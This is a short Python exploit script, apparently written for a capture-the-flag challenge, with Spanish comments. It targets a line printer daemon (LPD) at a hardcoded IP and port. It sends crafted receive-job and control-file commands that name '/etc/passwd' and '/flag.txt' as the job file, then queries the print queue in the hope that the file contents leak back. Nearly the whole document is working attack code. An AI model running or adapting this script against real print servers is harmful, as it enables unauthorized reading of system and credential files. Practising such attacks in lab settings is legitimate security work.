#!/usr/bin/env python3
import socket
import time

TARGET = "94.237.49.23"
PORT = 37326

def create_job_with_file(filename):
    """Crear un job que intenta leer un archivo"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((TARGET, PORT))
    
    # Step 1: Receive job
    s.sendall(b'\x02lp\n')
    time.sleep(0.2)
    resp1 = s.recv(1024)
    print(f"Response to receive job: {resp1.hex()}")
    
    # Step 2: Receive control file
    # Control file con comando U (user), H (host), N (name of file), f (formatted file to print)
    control = f"Uroot\nHlocalhost\nN{filename}\nf{filename}\n".encode()
    cmd2 = b'\x02' + str(len(control)).encode() + b' cfA001localhost\n' + control + b'\x00'
    s.sendall(cmd2)
    time.sleep(0.2)
    resp2 = s.recv(1024)
    print(f"Response to control file: {resp2.hex()}")
    
    s.close()

def query_queue():
    """Consultar la cola"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((TARGET, PORT))
    
    s.sendall(b'\x04lp\n')
    time.sleep(0.5)
    
    resp = b''
    s.settimeout(2)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
    except socket.timeout:
        pass
    
    s.close()
    return resp

# Test 1: Crear job con /etc/passwd
print("=== Creando job con /etc/passwd ===")
create_job_with_file("/etc/passwd")
time.sleep(1)

print("\n=== Consultando cola ===")
resp = query_queue()
print(f"Response length: {len(resp)}")
print(f"Hex: {resp.hex()}")
if len(resp) > 1:
    try:
        print(f"Text:\n{resp.decode('utf-8', errors='replace')}")
    except:
        print(f"Raw: {resp}")
print()

# Test 2: Crear job con /flag.txt
print("=== Creando job con /flag.txt ===")
create_job_with_file("/flag.txt")
time.sleep(1)

print("\n=== Consultando cola ===")
resp = query_queue()
print(f"Response length: {len(resp)}")
print(f"Hex: {resp.hex()}")
if len(resp) > 1:
    try:
        print(f"Text:\n{resp.decode('utf-8', errors='replace')}")
    except:
        print(f"Raw: {resp}")